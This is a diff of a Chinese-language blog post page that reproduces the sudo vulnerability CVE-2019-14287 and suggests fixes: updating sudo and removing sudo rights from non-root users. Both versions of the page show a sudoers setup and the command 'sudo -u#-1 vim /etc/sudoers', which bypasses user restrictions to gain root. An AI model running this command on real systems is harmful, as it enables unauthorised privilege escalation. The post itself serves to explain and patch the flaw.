@@ -7,7 +7,7 @@
     
     <title>重现sudo漏洞 - Actiger跳跳虎</title>
     
-    <meta name="description" content=" 1. 首先创建onetiger用户, 然后在/etc/sudoers中添加onetiger用户的sudo命令, 即/etc/sudoers中添加下面代码(root身份) onetiger ALL=/bin/vim 2. 登录onetiger用户 3. 以onetiger用户执行下面命令, 以用户id -1或4294967295运行后, 再0(用户id是0是root)用户运行命令成功. sudo -u#-1 vim /etc/sudoers sudo -u#0 vim /etc/sudoers 4. 解决办法. 4.1 CVE-2019-14287 漏洞影响 1.8.28 之前的 Sudo 版本, 将 sudo 软件包更新为最新版本. 4.2 禁用非root用户的sudo权限. ">
+    <meta name="description" content="1. 首先创建onetiger用户, 然后在/etc/sudoers中添加onetiger用户的sudo命令, 即/etc/sudoers中添加下面代码(root身份) onetiger ALL=/bin/vim 2. 登录onetiger用户 3. 以onetiger用户执行下面命令, 以用户id -1或4294967295运行后, 再0(用户id是0是root)用户运行命令成功. sudo -u#-1 vim /etc/sudoers sudo -u#0 vim /etc/sudoers 4. 解决办法. 4.1 CVE-2019-14287 漏洞影响 1.8.28 之前的 Sudo 版本, 将 sudo 软件包更新为最新版本. 4.2 禁用非root用户的sudo权限. ">
     <meta name="author" content="">
     
     <link href="https://charles-one.github.io/actiger/an-old-hope.min.css" rel="stylesheet">
@@ -80,21 +80,17 @@
     <h1 class="post-title">重现sudo漏洞</h1>
     <div class="post-meta">January 10, 2020</div>
   </header>
-  <div class="post-content">
-
-<h3 id="1-首先创建onetiger用户-然后在-etc-sudoers中添加onetiger用户的sudo命令-即-etc-sudoers中添加下面代码-root身份">1. 首先创建onetiger用户, 然后在/etc/sudoers中添加onetiger用户的sudo命令, 即/etc/sudoers中添加下面代码(root身份)</h3>
-<pre><code>onetiger ALL=/bin/vim</code></pre>
-<h3 id="2-登录onetiger用户">2. 登录onetiger用户</h3>
-
-<h3 id="3-以onetiger用户执行下面命令-以用户id-1或4294967295运行后-再0-用户id是0是root-用户运行命令成功">3. 以onetiger用户执行下面命令, 以用户id -1或4294967295运行后, 再0(用户id是0是root)用户运行命令成功.</h3>
+  <div class="post-content"><h3 id="1-首先创建onetiger用户-然后在etcsudoers中添加onetiger用户的sudo命令-即etcsudoers中添加下面代码root身份">1. 首先创建onetiger用户, 然后在/etc/sudoers中添加onetiger用户的sudo命令, 即/etc/sudoers中添加下面代码(root身份)</h3>
+<pre><code>onetiger ALL=/bin/vim
+</code></pre><h3 id="2-登录onetiger用户">2. 登录onetiger用户</h3>
+<h3 id="3-以onetiger用户执行下面命令-以用户id--1或4294967295运行后-再0用户id是0是root用户运行命令成功">3. 以onetiger用户执行下面命令, 以用户id -1或4294967295运行后, 再0(用户id是0是root)用户运行命令成功.</h3>
 <pre><code>sudo -u#-1 vim /etc/sudoers
 
-sudo -u#0 vim /etc/sudoers</code></pre>
-<h3 id="4-解决办法">4. 解决办法.</h3>
+sudo -u#0 vim /etc/sudoers
 
-<h4 id="4-1-cve-2019-14287-漏洞影响-1-8-28-之前的-sudo-版本-将-sudo-软件包更新为最新版本">4.1 CVE-2019-14287 漏洞影响 1.8.28 之前的 Sudo 版本, 将 sudo 软件包更新为最新版本.</h4>
-
-<h4 id="4-2-禁用非root用户的sudo权限">4.2 禁用非root用户的sudo权限.</h4>
+</code></pre><h3 id="4-解决办法">4. 解决办法.</h3>
+<h4 id="41-cve-2019-14287-漏洞影响-1828-之前的-sudo-版本-将-sudo-软件包更新为最新版本">4.1 CVE-2019-14287 漏洞影响 1.8.28 之前的 Sudo 版本, 将 sudo 软件包更新为最新版本.</h4>
+<h4 id="42-禁用非root用户的sudo权限">4.2 禁用非root用户的sudo权限.</h4>
 </div>
   
 </article></main>
